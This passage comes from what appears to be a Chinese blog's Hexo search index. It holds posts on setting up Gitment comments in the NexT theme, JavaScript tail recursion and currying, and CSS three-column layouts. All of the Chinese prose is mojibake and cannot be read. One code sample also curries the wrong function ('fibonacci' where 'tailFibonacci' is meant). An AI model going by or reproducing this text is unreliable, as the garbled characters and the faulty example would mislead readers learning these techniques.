ç¼–è¾‘ä¸»é¢˜é…ç½®æ–‡ä»¶ä¸­çš„busuanzi_countçš„é…ç½®é¡¹ã€‚å½“enable: trueæ—¶ï¼Œä»£è¡¨å¼€å¯å…¨å±€å¼€å…³ã€‚è‹¥total_visitorsã€total_viewsã€post_viewsçš„å€¼å‡ä¸ºfalseæ—¶ï¼Œä¸è’œå­ä»…ä½œè®°å½•è€Œä¸ä¼šåœ¨é¡µé¢ä¸Šæ˜¾ç¤ºã€‚ å†…å®¹åˆ†äº«æœåŠ¡Nextä¸»é¢˜è¿˜æä¾›äº†å¯¹å¤–æä¾›åˆ†äº«æŽ¥å£ï¼ŒåŒ…æ‹¬ç™¾åº¦åˆ†äº«ã€addthis Shareå’ŒNeedMoreShare2ï¼Œè¦ç”¨åˆ°å“ªä¸ªï¼Œåªéœ€æŠŠç›¸åº”enable: trueï¼Œæ³¨å†Œè´¦å·èŽ·å–idå³å¯ã€‚ è¯„è®ºåŠŸèƒ½å½“å‰ç‰ˆæœ¬é…ç½®ï¼Œæ”¯æŒç•…è¨€ï¼ŒDisqusï¼Œvalineï¼Œgitmentã€‚ ç•…è¨€ - æœç‹æä¾›çš„è¯„è®ºç»„ä»¶ï¼ŒåŠŸèƒ½ä¸°å¯Œï¼Œä½“éªŒä¼˜å¼‚ï¼Œé˜²æ­¢æ³¨æ°´ï¼›ä½†å¿…é¡»è¿›è¡ŒåŸŸåå¤‡æ¡ˆã€‚åªè¦åŸŸåå¤‡è¿‡æ¡ˆå°±å¯ä»¥é€šè¿‡å®¡æ ¸ã€‚ Disqus - å›½å¤–ä½¿ç”¨è¾ƒå¤šçš„è¯„è®ºç»„ä»¶ã€‚ä¸‡é‡Œé•¿åŸŽæ°¸ä¸å€’ï¼Œä¸€æžçº¢æå‡ºå¢™æ¥ï¼Œä½ æ‡‚çš„ã€‚ valine - LeanCloudæä¾›çš„åŽç«¯äº‘æœåŠ¡ï¼Œå¯ç”¨äºŽç»Ÿè®¡ç½‘å€è®¿é—®æ•°æ®ï¼Œåˆ†ä¸ºå¼€å‘ç‰ˆå’Œå•†ç”¨ç‰ˆï¼Œåªéœ€è¦æ³¨å†Œç”Ÿæˆåº”ç”¨App IDå’ŒApp Keyå³å¯ä½¿ç”¨ã€‚ Ditment - Gitment æ˜¯ä¸€æ¬¾åŸºäºŽGitHub Issuesçš„è¯„è®ºç³»ç»Ÿã€‚æ”¯æŒåœ¨å‰ç«¯ç›´æŽ¥å¼•å…¥ï¼Œä¸éœ€è¦ä»»ä½•åŽç«¯ä»£ç ã€‚å¯ä»¥åœ¨é¡µé¢è¿›è¡Œç™»å½•ã€æŸ¥çœ‹ã€è¯„è®ºã€ç‚¹èµžç­‰æ“ä½œï¼ŒåŒæ—¶æœ‰å®Œæ•´çš„Markdown / GFMå’Œä»£ç é«˜äº®æ”¯æŒã€‚å°¤ä¸ºé€‚åˆå„ç§åŸºäºŽGitHub Pagesçš„é™æ€åšå®¢æˆ–é¡¹ç›®é¡µé¢ã€‚ ç•…è¨€è¦å¤‡æ¡ˆï¼Œå¯¹äºŽå¯¹äºŽæŒ‚é åœ¨GitHubçš„åšå®¢éžå¸¸çš„ä¸å‹å¥½ï¼Œæ”¾å¼ƒï¼Disqusï¼Œç›®å‰å›½å†…ç½‘ç»œçŽ¯å¢ƒè®¿é—®ä¸äº†ï¼Œæ”¾å¼ƒï¼valineåœ¨ç”¨æˆ·æ²¡æœ‰è®¤è¯ç™»å½•å¯ä»¥è¯„è®ºï¼Œä¸èƒ½é˜²æ­¢æ¶æ„æ³¨æ°´ï¼Œæ”¾å¼ƒï¼æˆ‘é€‰æ‹©ç”¨Gitmentï¼Œè®©ç”¨æˆ·ç”¨è‡ªå·±çš„GitHubè´¦å·æ‰èƒ½è¯„è®ºï¼Œç”¨gitçš„ä¸€ä¸ªä»“åº“æ¥å­˜å‚¨è¯„è®ºï¼ˆè¯„è®ºä»¥è¯¥ä»“åº“çš„issueå½¢å¼å±•çŽ°ï¼‰ã€‚ gitmenté…ç½®Gitmentçš„å…¨éƒ¨é…ç½®é¡¹å¦‚ä¸‹ï¼Œ 123456789101112131415# Gitment# Introduction: https://imsun.net/posts/gitment-introduction/gitment: enable: true mint: true # RECOMMEND, A mint on Gitment, to support count, language and proxy_gateway count: true # Show comments count in post meta area lazy: false # Comments lazy loading with a button cleanly: true # Hide 'Powered by ...' on footer, and more language: zh-CN # Force language, or auto switch by theme github_user: xxx # MUST HAVE, Your Github Username github_repo: xxx # MUST HAVE, The name of the repo you use to store Gitment comments client_id: xxx # MUST HAVE, Github client id for the Gitment client_secret: xxx # EITHER this or proxy_gateway, Github access secret token for the Gitment proxy_gateway: # Address of api proxy, See: https://github.com/aimingoo/intersect redirect_protocol: # Protocol of redirect_uri with force_redirect_protocol when mint enabled å¼€å¯enableä¸ºtrueå°±æ˜¾ç¤ºè¯„è®ºæ¡†äº†ï¼Œä¸è¿‡è¦çœŸæ­£å®žçŽ°è¯„è®ºå¯ç”¨ï¼Œéœ€è¦ç”¨è‡ªå·±çš„githubè´¦å·æ³¨å†Œä¸€ä¸ªåº”ç”¨è®¸å¯è¯ä¹¦ï¼Œå³OAuth applicationï¼Œæ³¨å†ŒæˆåŠŸå°±ç”Ÿæˆäº†client_idå’Œclient_secretã€‚ æ­¥éª¤ï¼šä½ çš„githubé¦–é¡µ &gt; settings &gt; Developer settings &gt; OAuth Apps &gt; New oAuth Appã€‚å¡«å†™å¥½ç›¸å…³ä¿¡æ¯ï¼Œå…¶ä¸­ï¼ŒHomepage URLå’ŒAuthorization callback URLéƒ½å†™ä¸Šä½ çš„githubåšå®¢é¦–é¡µåœ°å€ï¼Œæ¯”å¦‚https://xxx.github.io/ï¼Œç‚¹å‡»Register applicationå³å¯å®Œæˆæ³¨å†Œï¼Œç”ŸæˆClient IDå’ŒClient Secretã€‚ è¿™æ ·ï¼Œç”¨æˆ·ç‚¹å‡»è¯„è®ºæ¡†å³è¾¹ç™»å…¥è·³è½¬åˆ°githubæŽˆæƒï¼Œå…è®¸æŽˆæƒè·³è½¬å›žæ¥å°±å¯ä»¥è¯„è®ºå•¦ï¼ å°å‘ï¼šæœ‰äº›æ–‡ç« è¯„è®ºåˆå§‹åŒ–å¼¹å‡ºvalidation failedé”™è¯¯ å› ä¸ºGitHubçš„æ¯ä¸ªissuesæœ‰ä¸¤ä¸ªlablesï¼Œä¸€ä¸ªæ˜¯gitmentï¼Œå¦ä¸€ä¸ªæ˜¯idï¼Œidå–çš„æ˜¯é¡µé¢pathnameï¼Œæ ‡ç­¾é•¿åº¦é™å®šä¸è¶…è¿‡50ä¸ªå­—ç¬¦ï¼Œè€Œåƒä¸€èˆ¬ä¸­æ–‡æ ‡é¢˜æ–‡ç« ï¼Œè½¬ä¹‰åŽå­—ç¬¦å¾ˆå®¹æ˜“è¶…è¿‡50ä¸ªå­—ç¬¦ã€‚ ç›®å½•blog/themes/next/layout/_third-party/commentsæ‰¾åˆ°æ–‡ä»¶gitment.swigï¼Œ åœ¨è¿™é‡Œæˆ‘ç”¨æ–‡ç« åˆ›å»ºæ—¶é—´æˆ³æ¥å½“ä½œidï¼Œè¿™æ ·é•¿åº¦å°±ä¸ä¼šè¶…è¿‡50ä¸ªå­—ç¬¦ï¼ŒæˆåŠŸè§£å†³ï¼ ä¸ƒã€æ€»ç»“æž„å»ºè‡ªå·±çš„åšå®¢å¹¶ä¸éš¾ï¼Œä¹Ÿä¸éœ€è¦ä»€ä¹ˆä¸“ä¸šä»£ç åŸºç¡€ï¼Œéœ€è¦çš„æ˜¯è€å¿ƒè€Œå·²ï¼ˆâ”­â”®ï¹â”­â”®éƒ½æ˜¯é…ç½®ï¼‰ã€‚PSï¼šæˆ‘çš„GitHubåšå®¢https://wuwhs.github.io å¤§ä½¬æ‹è½»ç‚¹]]></content>
      <categories>
        <category>å…¶å®ƒ</category>
      </categories>
      <tags>
        <tag>git nodejs hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å°¾è°ƒç”¨]]></title>
    <url>%2F2018%2F07%2F27%2F%E5%B0%BE%E8%B0%83%E7%94%A8%2F</url>
    <content type="text"><![CDATA[å‰è¨€é¢æŸä¸œï¼Œæœ‰ä¸€é“é¢˜ç›®æ˜¯ å®žçŽ°ä¸€ä¸ªæ–æ³¢æ‹‰å¥‘æ•°åˆ—ï¼Œ å·²çŸ¥ç¬¬ä¸€é¡¹ä¸º0ï¼Œç¬¬äºŒé¡¹ä¸º1ï¼Œç¬¬ä¸‰é¡¹ä¸º1ï¼ŒåŽä¸€é¡¹æ˜¯å‰ä¸¤é¡¹ä¹‹å’Œï¼Œå³f(n) = f(n - 1) + f(n -2)ã€‚ æ‹¿åˆ°è¿™ä¸ªé¢˜ç›®ï¼ŒäºŒè¯æ²¡æƒ³å°±å†™äº† 12345function f(n) &#123; if(n === 0) return 0; if(n === 1) return 1; return f(n - 1) + f(n -2);&#125; åŽæ¥å›žæƒ³ï¼ŒåŽæ‚”æ­»äº†ï¼Œè¿™æ˜Žæ˜¾æ²¡è¿™ä¹ˆç®€å•ï¼Œæ¯æ¬¡é€’å½’è°ƒç”¨éƒ½ä¼šå‘ˆæŒ‡æ•°å¾€è°ƒç”¨æ ˆé‡Œå¢žåŠ è®°å½•â€œè°ƒç”¨å¸§â€œï¼Œè¿™æ ·åšï¼Œå½“é¡¹æ¯”è¾ƒå¤šï¼Œå°±ä¼šå‡ºçŽ°â€œæ ˆæº¢å‡ºâ€çš„ï¼ï¼ï¼ä¹Ÿå°±æ˜¯ï¼Œè¿™ä¸ªç­”æ¡ˆæ˜¯ä¸åŠæ ¼çš„ï¼Œæ­£ç¡®å§¿åŠ¿åº”è¯¥ç”¨å°¾é€’å½’ä¼˜åŒ–ï¼Œâ€è°ƒç”¨å¸§â€œä¿æŒåªæœ‰ä¸€ä¸ªã€‚æ­£è§£ä¹Ÿå°±æ˜¯ï¼š 123456function f(n, prev, next) &#123; if(n &lt;= 1) &#123; return next; &#125; return f(n - 1, next, prev + next);&#125; ä¸‹é¢æ¥å¤ä¹ ä¸€ä¸‹çŸ¥è¯†ç‚¹ï¼šå°¾è°ƒç”¨å’Œå°¾é€’å½’ã€‚PSï¼šæ›´å¥½çš„æ–¹æ¡ˆè¯·ç»§ç»­å¾€ä¸‹çœ‹ã€‚ å°¾è°ƒç”¨å°¾è°ƒç”¨æ˜¯æŒ‡æŸä¸ªå‡½æ•°çš„æœ€åŽä¸€æ­¥æ˜¯è°ƒç”¨å¦ä¸€ä¸ªå‡½æ•°ã€‚ ä»¥ä¸‹ä¸‰ç§æƒ…å†µéƒ½ä¸æ˜¯å°¾è°ƒç”¨ï¼š 123456789101112131415// æƒ…å†µä¸€function f(x) &#123; let y = g(x); return y;&#125;// æƒ…å†µäºŒfunction f(x) &#123; return g(x) + 1;&#125;// æƒ…å†µä¸‰function f(x) &#123; g(x);&#125; æƒ…å†µä¸€æ˜¯è°ƒç”¨å‡½æ•°gä¹‹åŽï¼Œè¿˜æœ‰èµ‹å€¼æ“ä½œï¼Œæ‰€ä»¥ä¸å±žäºŽå°¾è°ƒç”¨ï¼Œå³ä½¿è¯­ä¹‰å®Œå…¨ä¸€æ ·ã€‚æƒ…å†µäºŒä¹Ÿæ˜¯å±žäºŽè°ƒç”¨åŽè¿˜æœ‰æ“ä½œã€‚æƒ…å†µä¸‰ç­‰åŒäºŽï¼š 12g(x);return undefined; å‡½æ•°è°ƒç”¨ä¼šåœ¨å†…å­˜å½¢æˆä¸€ä¸ªâ€œè°ƒç”¨è®°å½•â€ï¼Œåˆç§°â€œè°ƒç”¨å¸§â€ï¼Œä¿å­˜è°ƒç”¨ä½ç½®å’Œå†…å­˜å˜é‡ç­‰ä¿¡æ¯ã€‚å¦‚æžœåœ¨å‡½æ•°Açš„å†…éƒ¨è°ƒç”¨å‡½æ•°Bï¼Œé‚£ä¹ˆåœ¨Açš„è°ƒç”¨å¸§ä¸Šæ–¹ï¼Œè¿˜ä¼šå½¢æˆä¸€ä¸ªBçš„è°ƒç”¨å¸§ã€‚ç­‰åˆ°Bè¿è¡Œç»“æŸï¼Œå°†ç»“æžœè¿”å›žåˆ°Aï¼ŒBçš„è°ƒç”¨å¸§æ‰ä¼šæ¶ˆå¤±ã€‚å¦‚æžœå‡½æ•°Bå†…éƒ¨è¿˜è°ƒç”¨å‡½æ•°Cï¼Œé‚£å°±è¿˜æœ‰ä¸€ä¸ªCçš„è°ƒç”¨å¸§ï¼Œä¾æ¬¡ç±»æŽ¨ã€‚æ‰€æœ‰çš„è°ƒç”¨å¸§ï¼Œå°±å½¢æˆä¸€ä¸ªâ€œè°ƒç”¨æ ˆâ€ã€‚ å°¾è°ƒç”¨ç”±äºŽæ˜¯å‡½æ•°çš„æœ€åŽä¸€æ­¥æ“ä½œï¼Œæ‰€æœ‰ä¸éœ€è¦ä¿ç•™å¤–å±‚å‡½æ•°çš„è°ƒç”¨å¸§ï¼Œå› ä¸ºè°ƒç”¨ä½ç½®ã€å†…éƒ¨å˜é‡ç­‰ä¿¡æ¯éƒ½ä¸ä¼šå†ç”¨åˆ°äº†ï¼Œåªè¦ç›´æŽ¥ç”¨å†…å±‚å‡½æ•°çš„è°ƒç”¨å¸§ï¼Œå–ä»£å¤–å±‚å‡½æ•°çš„è°ƒç”¨å¸§å°±å¯ä»¥äº†ã€‚ 123456789101112131415function f() &#123; let m = 0; let n = 2; return g(m + n);&#125;f();// ç­‰åŒäºŽfunction f() &#123; return g(3);&#125;f();// ç­‰åŒäºŽg(3); å¦‚æžœæ‰€æœ‰å‡½æ•°éƒ½æ˜¯å°¾è°ƒç”¨ï¼Œé‚£ä¹ˆå®Œå…¨å¯ä»¥åšåˆ°æ¯æ¬¡æ‰§è¡Œæ—¶ï¼Œè°ƒç”¨å¸§åªæœ‰ä¸€é¡¹ï¼Œè¿™å°†å¤§å¤§èŠ‚çœå†…å­˜ã€‚è¿™å°±æ˜¯â€œå°¾è°ƒç”¨ä¼˜åŒ–â€ã€‚ æ³¨æ„ï¼Œåªæœ‰ä¸å†ç”¨åˆ°å¤–å±‚å‡½æ•°çš„å†…éƒ¨å˜é‡ï¼Œå†…å±‚å‡½æ•°çš„è°ƒç”¨å¸§æ‰ä¼šå–ä»£å¤–å±‚å‡½æ•°çš„è°ƒç”¨å¸§ï¼Œå¦åˆ™å°±æ— æ³•è¿›è¡Œâ€œå°¾è°ƒç”¨ä¼˜åŒ–â€ã€‚ 1234567function addOne(a) &#123; var one = 1; function inner(b) &#123; return b + one; &#125; return inner(a);&#125; å°¾é€’å½’å‡½æ•°è°ƒç”¨è‡ªèº«ï¼Œç§°ä¸ºé€’å½’ã€‚å¦‚æžœå°¾è°ƒç”¨è‡ªèº«ï¼Œå°±ç§°ä¸ºå°¾é€’å½’ã€‚é€’å½’éžå¸¸è€—è´¹å†…å­˜ï¼Œå› ä¸ºéœ€è¦åŒæ—¶ä¿å­˜æˆç™¾ä¸Šåƒè°ƒç”¨å¸§ï¼Œå¾ˆå®¹æ˜“å‘ç”Ÿâ€œæ ˆæº¢å‡ºâ€é”™è¯¯ã€‚ä½†å¯¹äºŽå°¾é€’å½’æ¥è¯´ï¼Œç”±äºŽåªå­˜åœ¨ä¸€ä¸ªè°ƒç”¨å¸§ï¼Œæ‰€ä»¥æ°¸è¿œä¸ä¼šå‘ç”Ÿâ€œæ ˆæº¢å‡ºâ€é”™è¯¯ã€‚ 12345function factorial(n) &#123; if (n === 1) return 1; return n * factorial(n - 1);&#125;console.log(factorial(5)); // 120 ä¸Šé¢æœ€å¤šä¿å­˜nä¸ªè°ƒç”¨è®°å½•ï¼Œå¤æ‚åº¦æ˜¯O(n)ã€‚ å¦‚æžœæ”¹æˆå°¾é€’å½’ï¼Œåªä¿ç•™ä¸€ä¸ªè°ƒç”¨è®°å½•ï¼Œå¤æ‚åº¦O(1)ã€‚ 12345function factorial(n, total) &#123; if (n === 0) return total; return factorial(n - 1, n * total);&#125;console.log(factorial(5, 1)); // 120 ä¸‹é¢å›žåˆ°æˆ‘ä»¬çš„ä¸»é¢˜ï¼Œè®¡ç®—Fibonacciæ•°åˆ—ã€‚ 123456function fibonacci(n) &#123; if(n &lt;= 1) return 1; return fibonacci(n -1) + fibonacci(n -2);&#125;console.log(fibonacci(10)); // 89console.log(fibonacci(50)); // stack overflow ä¸Šé¢ä¸ä½¿ç”¨å°¾é€’å½’ï¼Œé¡¹æ•°ç¨å¤§ç‚¹å°±å‘ç”Ÿâ€æ ˆæº¢å‡ºâ€œäº†ã€‚ 1234567function fibonacci(n, prev, next) &#123; if(n &lt;= 1) return next; return fibonacci(n-1, next, prev + next);&#125;console.log(fibonacci(10, 1, 1)); // 89console.log(fibonacci(100, 1, 1)); // 573147844013817200000console.log(fibonacci(1000, 1, 1)); // 7.0330367711422765e+208 ä¸Šé¢é¡¹æ•°å†å¤§éƒ½çŠ¶æ€è‰¯å¥½ã€‚ æŸ¯ç†åŒ–æ”¹å†™å°¾é€’å½’çš„å®žçŽ°ï¼Œå¾€å¾€éœ€è¦æ”¹å†™é€’å½’å‡½æ•°ï¼Œç¡®ä¿æœ€åŽä¸€æ­¥åªè°ƒç”¨è‡ªèº«ã€‚åšåˆ°è¿™ä¸€ç‚¹çš„æ–¹æ³•ï¼Œå°±æ˜¯æŠŠæ‰€æœ‰ç”¨åˆ°çš„å†…éƒ¨å˜é‡æ”¹å†™æˆå‡½æ•°çš„å‚æ•°ã€‚ä½†æ˜¯è¿™æ ·çš„è¯å°±ä¼šå¢žåŠ åˆå§‹å…¥å‚ï¼Œæ¯”å¦‚fibonacci(10, 1, 1)ï¼ŒåŽé¢çš„ä¸¤ä¸ªå‚æ•°1å’Œ1æ„æ€ä¸æ˜Žç¡®ï¼Œç›´æŽ¥ç”¨fibonacci(100)æ‰æ˜¯ä¹ æƒ¯ç”¨æ³•ã€‚æ‰€ä»¥éœ€è¦åœ¨ä¸­é—´é¢„å…ˆè®¾ç½®å¥½åˆå§‹å…¥å‚ï¼Œå°†å¤šä¸ªå…¥å‚è½¬åŒ–æˆå•ä¸ªå…¥å‚çš„å½¢å¼ï¼Œå«åšå‡½æ•°æŸ¯ç†åŒ–ã€‚é€šç”¨æ–¹å¼ä¸ºï¼š 12345678function curry(fn) &#123; var args = Array.prototype.slice.call(arguments, 1); return function () &#123; var innerArgs = Array.prototype.slice.call(arguments); var finalArgs = innerArgs.concat(args); return fn.apply(null, finalArgs); &#125;&#125; ç”¨å‡½æ•°æŸ¯ç†åŒ–æ”¹å†™é˜¶ä¹˜ 1234567function tailFactorial(n, total) &#123; if(n === 1) return total; return tailFactorial(n - 1, n * total);&#125;var factorial = curry(tailFactorial, 1);console.log(factorial(5)); // 120 åŒæ ·æ”¹å†™æ–æ³¢æ‹‰å¥‘æ•°åˆ— 123456789function tailFibonacci(n, prev, next) &#123; if(n &lt;= 1) return next; return tailFibonacci(n - 1, next, prev + next);&#125;var fibonacci = curry(fibonacci, 1, 1);console.log(fibonacci(10)); // 89console.log(fibonacci(100)); // 573147844013817200000console.log(fibonacci(1000)); // 7.0330367711422765e+208 ES6æ”¹å†™æŸ¯ç†åŒ–çš„è¿‡ç¨‹å…¶å®žæ˜¯åˆå§‹åŒ–ä¸€äº›å‚æ•°çš„è¿‡ç¨‹ï¼Œåœ¨ES6ä¸­ï¼Œæ˜¯å¯ä»¥ç›´æŽ¥å‡½æ•°å‚æ•°é»˜è®¤èµ‹å€¼çš„ã€‚ ç”¨ES6æ”¹å†™é˜¶ä¹˜ 12345const factorial = (n, total = 1) =&gt; &#123; if(n === 1) return total; return factorial(n - 1, n * total);&#125;console.log(factorial(5)); // 120 ç”¨ES6æ”¹å†™æ–æ³¢æ‹‰å¥‘æ•°åˆ— 1234567const fibonacci = (n, prev = 1, next = 1) =&gt; &#123; if(n &lt;= 1) return next; return fibonacci(n - 1, next, prev + next);&#125;console.log(fibonacci(10)); // 89console.log(fibonacci(100)); // 573147844013817200000console.log(fibonacci(1000)); // 7.0330367711422765e+208 psï¼šç”¨ES6æžå¤§æ–¹ä¾¿äº†ç®—æ³•è¿ç”¨ï¼ æ€»ç»“ç»¼ä¸Šï¼Œè¿™ä¸ªé—®é¢˜è§£å†³çš„æ€è·¯æ˜¯ï¼š å°¾é€’å½’+å‡½æ•°æŸ¯ç†åŒ–ï¼› å°¾é€’å½’+ES6é»˜è®¤èµ‹å€¼ï¼› ç®—æ³•é¢˜æ°¸è¿œè¦æƒ³åˆ°æ€§èƒ½é—®é¢˜ï¼Œä¸èƒ½åªåœç•™åˆ°è¡¨é¢ï¼Œé»˜å“€ä¸‰ç§’é’Ÿï¼Œ[æ‚²ä¼¤è„¸.gif]ã€‚]]></content>
      <categories>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>javascript</tag>
        <tag>ç®—æ³•</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æžå®šcssä¸‰åˆ—å¸ƒå±€]]></title>
    <url>%2F2018%2F07%2F22%2F%E6%90%9E%E5%AE%9Acss%E4%B8%89%E5%88%97%E5%B8%83%E5%B1%80%2F</url>
    <content type="text"><![CDATA[è°ˆåˆ°å¸ƒå±€ï¼Œé¦–å…ˆå°±è¦æƒ³åˆ°å®šä½ï¼Œå½“åˆ«äººé—®æˆ‘ï¼Œcssçš„positionå®šä½æœ‰å“ªäº›å–å€¼ï¼Œåˆ†åˆ«è¡¨ç¤ºä»€ä¹ˆæ„æ€ï¼Ÿå‘ƒâ€¦.. å®šä½positionæœ‰å…­ä¸ªå±žæ€§å€¼ï¼šstaticã€relativeã€absoluteã€fixedã€stickyå’Œinheritã€‚ staticï¼ˆé»˜è®¤ï¼‰ï¼šå…ƒç´ æ¡†æ­£å¸¸ç”Ÿæˆã€‚å—çº§å…ƒç´ ç”Ÿæˆä¸€ä¸ªçŸ©å½¢æ¡†ï¼Œä½œä¸ºæ–‡æ¡£æµçš„ä¸€éƒ¨åˆ†ï¼›è¡Œå†…å…ƒç´ åˆ™ä¼šåˆ›å»ºä¸€ä¸ªæˆ–å¤šä¸ªè¡Œæ¡†ï¼Œç½®äºŽçˆ¶çº§å…ƒç´ ä¸­ã€‚ relativeï¼šå…ƒç´ æ¡†ç›¸å¯¹äºŽä¹‹å‰æ­£å¸¸æ–‡æ¡£æµä¸­çš„ä½ç½®å‘ç”Ÿåç§»ï¼Œå¹¶ä¸”åŽŸå…ˆçš„ä½ç½®ä»ç„¶è¢«å æ®ã€‚å‘ç”Ÿåç§»çš„æ—¶å€™ï¼Œå¯èƒ½ä¼šè¦†ç›–å…¶ä»–å…ƒç´ ã€‚ absoluteï¼šå…ƒç´ æ¡†ä¸å†å æœ‰æ–‡æ¡£ä½ç½®ï¼Œå¹¶ä¸”ç›¸å¯¹äºŽåŒ…å«å—è¿›è¡Œåç§»ï¼ˆæ‰€è°“åŒ…å«å—å°±æ˜¯æœ€è¿‘ä¸€çº§å¤–å±‚å…ƒç´ positionä¸ä¸ºstaticçš„å…ƒç´ ï¼‰ã€‚ fixedï¼šå…ƒç´ æ¡†ä¸å†å æœ‰æ–‡æ¡£æµä½ç½®ï¼Œå¹¶ä¸”ç›¸å¯¹äºŽè§†çª—è¿›è¡Œå®šä½ã€‚ stickyï¼šcss3æ–°å¢žå±žæ€§å€¼ï¼Œç²˜æ€§å®šä½ï¼Œç›¸å½“äºŽrelativeå’Œfixedçš„æ··åˆã€‚æœ€åˆä¼šè¢«å½“ä½œæ˜¯relativeï¼Œç›¸å¯¹åŽŸæ¥ä½ç½®è¿›è¡Œåç§»ï¼›ä¸€æ—¦è¶…è¿‡ä¸€å®šçš„é˜ˆå€¼ï¼Œä¼šè¢«å½“æˆfixedå®šä½ï¼Œç›¸å¯¹äºŽè§†å£å®šä½ã€‚ ä¸‰åˆ—å¸ƒå±€ä¸‰åˆ—å¸ƒå±€ï¼Œå…¶ä¸­ä¸€åˆ—å®½åº¦è‡ªé€‚åº”ï¼Œåœ¨PCç«¯æœ€å¸¸ç”¨ä¹‹ä¸€ï¼Œæžå®šäº†ä¸‰åˆ—å¸ƒå±€ï¼Œå…¶ä»–ä¸€æ ·çš„å¥—è·¯ã€‚ æ–¹å¼ä¸€ï¼šæµ®åŠ¨å¸ƒå±€ç¼ºç‚¹ï¼šhtmlç»“æž„ä¸æ­£ç¡®,å½“åŒ…å«åŒºåŸŸå®½åº¦å°äºŽå·¦å³æ¡†ä¹‹å’Œï¼Œå³è¾¹æ¡†ä¼šè¢«æŒ¤ä¸‹æ¥ 1234567891011121314151617181920212223242526272829303132&lt;style&gt; .tree-columns-layout.float .left &#123; float: left; width: 300px; background-color: #a00; &#125; .tree-columns-layout.float .right &#123; float: right; width: 300px; background-color: #0aa; &#125; .tree-columns-layout.float .center &#123; /* left: 300px; right: 300px; */ margin: 0 300px; background-color: #aa0; overflow: auto; &#125;&lt;/style&gt;&lt;section class="tree-columns-layout float"&gt; &lt;article class="left"&gt; &lt;h1&gt;æˆ‘æ˜¯æµ®åŠ¨å¸ƒå±€å·¦æ¡†&lt;/h1&gt; &lt;/article&gt; &lt;article class="right"&gt; &lt;h1&gt;æˆ‘æ˜¯æµ®åŠ¨å¸ƒå±€å³æ¡†&lt;/h1&gt; &lt;/article&gt; &lt;article class="center"&gt; &lt;h1&gt;æˆ‘æ˜¯æµ®åŠ¨å¸ƒå±€ä¸­é—´æ¡†&lt;/h1&gt; &lt;/article&gt;&lt;/section&gt; æ–¹å¼äºŒï¼šå®šä½å¸ƒå±€ç¼ºç‚¹ï¼šè¦æ±‚çˆ¶çº§è¦æœ‰éžstaticå®šä½ï¼Œå¦‚æžœæ²¡æœ‰ï¼Œå·¦å³æ¡†å®¹æ˜“åç§»å‡ºåŽ» 1234567891011121314151617181920212223242526272829303132333435363738&lt;style&gt; .tree-columns-layout.position &#123; position: relative; &#125; .tree-columns-layout.position .left &#123; position: absolute; left: 0; top: 0; width: 300px; background-color: #a00; &#125; .tree-columns-layout.position .right &#123; position: absolute; right: 0; top: 0; width: 300px; background-color: #0aa; &#125; .tree-columns-layout.position .center &#123; margin: 0 300px; background-color: #aa0; overflow: auto; &#125;&lt;/style&gt;&lt;section class="tree-columns-layout position"&gt; &lt;article class="left"&gt; &lt;h1&gt;æˆ‘æ˜¯æµ®åŠ¨å®šä½å·¦æ¡†&lt;/h1&gt; &lt;/article&gt; &lt;article class="center"&gt; &lt;h1&gt;æˆ‘æ˜¯æµ®åŠ¨å®šä½ä¸­é—´æ¡†&lt;/h1&gt; &lt;/article&gt; &lt;article class="right"&gt; &lt;h1&gt;æˆ‘æ˜¯æµ®åŠ¨å®šä½å³æ¡†&lt;/h1&gt; &lt;/article&gt;&lt;/section&gt; æ–¹å¼ä¸‰ï¼šè¡¨æ ¼å¸ƒå±€ç¼ºç‚¹ï¼šæ²¡ä»€ä¹ˆç¼ºç‚¹ï¼Œææƒ§table 123456789101112131415161718192021222324252627282930313233343536&lt;style&gt; .tree-columns-layout.table &#123; display: table; width: 100%; &#125; .tree-columns-layout.table &gt; article &#123; display: table-cell; &#125; .tree-columns-layout.table .left &#123; width: 300px; background-color: #a00; &#125; .tree-columns-layout.table .center &#123; background-color: #aa0; &#125; .tree-columns-layout.table .right &#123; width: 300px; background-color: #0aa; &#125;&lt;/style&gt;&lt;section class="tree-columns-layout table"&gt; &lt;article class="left"&gt; &lt;h1&gt;æˆ‘æ˜¯è¡¨æ ¼å¸ƒå±€å·¦æ¡†&lt;/h1&gt; &lt;/article&gt; &lt;article class="center"&gt; &lt;h1&gt;æˆ‘æ˜¯è¡¨æ ¼å¸ƒå±€ä¸­é—´æ¡†&lt;/h1&gt; &lt;/article&gt; &lt;article class="right"&gt; &lt;h1&gt;æˆ‘æ˜¯è¡¨æ ¼å¸ƒå±€å³æ¡†&lt;/h1&gt; &lt;/article&gt;&lt;/section&gt; æ–¹å¼å››ï¼šflexå¼¹æ€§å¸ƒå±€ç¼ºç‚¹ï¼šå…¼å®¹æ€§ 123456789101112131415161718192021222324252627282930313233&lt;style&gt; .tree-columns-layout.flex &#123; display: flex; &#125; .tree-columns-layout.flex .left &#123; width: 300px; flex-shrink: 0; /* ä¸ç¼©å° */ background-color: #a00; &#125; .tree-columns-layout.flex .center &#123; flex-grow: 1; /* å¢žå¤§ */ background-color: #aa0; &#125; .tree-columns-layout.flex .right &#123; flex-shrink: 0; /* ä¸ç¼©å° */ width: 300px; background-color: #0aa; &#125;&lt;/style&gt;&lt;section class="tree-columns-layout flex"&gt; &lt;article class="left"&gt; &lt;h1&gt;æˆ‘æ˜¯flexå¼¹æ€§å¸ƒå±€å·¦æ¡†&lt;/h1&gt; &lt;/article&gt; &lt;article class="center"&gt; &lt;h1&gt;æˆ‘æ˜¯flexå¼¹æ€§å¸ƒå±€ä¸­é—´æ¡†&lt;/h1&gt; &lt;/article&gt; &lt;article class="right"&gt; &lt;h1&gt;æˆ‘æ˜¯flexå¼¹æ€§å¸ƒå±€å³æ¡†&lt;/h1&gt; &lt;/article&gt;&lt;/section&gt; æ–¹å¼äº”ï¼šgridæ …æ ¼å¸ƒå±€ç¼ºç‚¹ï¼šå…¼å®¹æ€§ Firefox 52, Safari 10.1, Chrome 57, Opera 44 1234567891011121314151617181920212223242526272829&lt;style&gt; .tree-columns-layout.grid &#123; display: grid; grid-template-columns: 300px 1fr 300px; &#125; .tree-columns-layout.grid .left &#123; background-color: #a00; &#125; .tree-columns-layout.grid .center &#123; background-color: #aa0; &#125; .tree-columns-layout.grid .right &#123; background-color: #0aa; &#125;&lt;/style&gt;&lt;section class="tree-columns-layout grid"&gt; &lt;article class="left"&gt; &lt;h1&gt;æˆ‘æ˜¯gridæ …æ ¼å¸ƒå±€å·¦æ¡†&lt;/h1&gt; 